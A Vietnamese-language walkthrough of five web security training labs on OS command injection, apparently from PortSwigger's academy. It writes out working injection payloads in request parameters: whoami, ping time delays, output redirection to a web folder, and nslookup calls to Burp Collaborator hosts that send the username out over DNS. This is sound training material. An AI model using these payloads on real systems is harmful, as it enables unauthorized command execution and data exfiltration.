# OS Command Injection
## Executing arbitrary commands
**Lab1: OS command injection, simple case**

Bước 1: Truy cập vào một sản phẩm bất kỳ, click vào Check stock, bắt request này và gửi đến Repeater

![image](https://user-images.githubusercontent.com/74781135/203685214-fba36bb0-15e7-4127-89a8-e5fb24dc0040.png)

Có nhiều cách để thực thi nhiều lệnh trên một dòng trong một shell, ví dụ: **&**, **&&**, **|**, **||**,**;**. 

Bước 2: Đổi giá trị tham số productId và storeId

![image](https://user-images.githubusercontent.com/74781135/203687216-ef1802d4-d001-46a6-b608-c492fbc5200e.png)

Từ phản hồi có thể thấy cả hai tham số đều có thể chèn câu lệnh vào và chúng được thực thi theo thứ tự productId đầu tiên, storeId thứ hai.

Bước 3: Chèn lệnh whoami để lấy được tên user

![image](https://user-images.githubusercontent.com/74781135/203687572-7a7ac458-31bb-4697-be32-56a363c11c2b.png)

![image](https://user-images.githubusercontent.com/74781135/203687597-bb7c5dd5-b270-4fa2-9f86-a7f0bebfeb1d.png)

## Blind OS command injection
**Lab2: Blind OS command injection with time delays**

Bước 1: Chọn chức năng Submit feedback, bắt request này và gửi đến Repeater

![image](https://user-images.githubusercontent.com/74781135/203717987-8941a14a-4177-48e4-9910-d178bbd0516f.png)

Có nhiều cách để tạo độ trễ thời gian trên dấu nhắc lệnh, hầu hết phụ thuộc vào hệ điều hành (ví dụ: sleep in bash hoặc timeout trong Windows cmd). Có một lệnh có sẵn trên hầu hết mọi hệ thống có thể bị lạm dụng để gây ra sự chậm trễ: Lệnh **ping**. 

Bước 2: Thay đổi giá trị của **email=minh%40gmail.com;ping+127.0.0.1+-c+11;#** và gửi lại request. Ta thấy phản hồi là **10,707 millis**

![image](https://user-images.githubusercontent.com/74781135/203722508-fe6ea020-850e-409f-a095-fb498ad71ade.png)

Trên Windows ping mặc định cho bốn yêu cầu và mặc định này có thể được sử dụng để suy ra độ trễ. Nhưng trên Linux, ping được mặc định là vĩnh viễn, vì vậy nó sẽ không bao giờ dừng. **-c + n** là để chỉ rõ là sẽ thực hiện **n lệnh ping** trong trường hợp bài lab này là 11 lệnh ping.

![image](https://user-images.githubusercontent.com/74781135/203722303-1839aa76-d532-4044-860b-83c3eb98a715.png)

**Lab3: Blind OS command injection with output redirection**

Bước 1: Chọn chức năng Submit feedback, bắt request này và gửi đến Repeater

![image](https://user-images.githubusercontent.com/74781135/203726686-6981d202-958d-4f52-97b3-5f2e43d168d7.png)

Như mô tả của bài lab, có thể ghi tại thư mục **/var/www/images/**

Bước 2: Thay đổi giá trị của **email=minh%40gmail.com;whoami>/var/www/images/minh.txt;#** và gửi lại request

![image](https://user-images.githubusercontent.com/74781135/203728342-15920c64-cbbc-4af6-9f29-be01d156e815.png)

Bước 3: Truy cập vào một sản phẩm bất kỳ. Bắt request lấy ảnh và gửi đến Repeater

![image](https://user-images.githubusercontent.com/74781135/203728615-624156a8-c5fe-4433-ad79-d034b585ef54.png)

Bước 4: Thay đổi filename=minh.txt và gửi request. Ta thu được tên người dùng

![image](https://user-images.githubusercontent.com/74781135/203728976-9023f040-0dd9-454b-ae2a-a4f045636043.png)

![image](https://user-images.githubusercontent.com/74781135/203729051-73b357ec-c705-487d-ba8a-e5f46c39eaf9.png)

**Lab4: Blind OS command injection with out-of-band interaction**

Bước 1: Chọn chức năng Submit feedback, bắt request này và gửi đến Repeater

![image](https://user-images.githubusercontent.com/74781135/203731260-424b9700-5b4c-452a-a65f-bb59878d2511.png)

Theo như mô tả của bài lab, có thể kích hoạt các tương tác ngoài băng tần với miền bên ngoài. Do đó, mở một Burp Collaborator và tạo một payload mới. Chèn payload này vào giá trị của email.

Bước 2: Giá trị email là: **email=minh%40gmail.com;nslookup+omepn9u8wlj1remrojsxdwnoffl69wxl.oastify.com;#**.

![image](https://user-images.githubusercontent.com/74781135/203734245-671c72ac-1806-4f69-87f7-0460fed92efd.png)

Sau khi gửi request tại burp collaborator thấy có 2 bản tra cứu DNS sẽ được hiển thị.

![image](https://user-images.githubusercontent.com/74781135/203734859-b27dcacb-4e81-47a4-b176-c0cf5fee53d7.png)

![image](https://user-images.githubusercontent.com/74781135/203734926-ea17ef03-ee3b-42c4-88ae-3d57007c11ac.png)

**Lab5: Blind OS command injection with out-of-band data exfiltration**

Bước 1:  Chọn chức năng Submit feedback, bắt request này và gửi đến Repeater

![image](https://user-images.githubusercontent.com/74781135/203737005-df98b567-9090-4843-be28-7996173c5f6e.png)

Bước 2: Tương tự như bài Lab4, nhưng lần này yêu cầu thêm tên người dùng nên ta sẽ thêm đầu ra của whoami dưới dạng subdomain. Thay giá trị email thành: **email=minh%40gmail.com;nslookup+`whoami`.je1kf4m3ogbwj9emgeks5rfj7ad11upj.oastify.com;#** và gửi request

![image](https://user-images.githubusercontent.com/74781135/203752056-1937ac35-5b82-4ef7-8caa-56427bfed113.png)

Bước 3: Trong Burp Collaborator,  thấy có 2 bản tra cứu DNS sẽ được hiển thị. Subdomain chính là tên người dùng. username = **peter-1HDAhL**  

![image](https://user-images.githubusercontent.com/74781135/203752715-7327be5b-06d2-46dc-bf14-ef1ba122226c.png)

Bước 4: Submit tên người dùng và hoàn thành bài Lab

![image](https://user-images.githubusercontent.com/74781135/203753077-f2319d08-61fa-4ff7-9662-fd81d558889d.png)
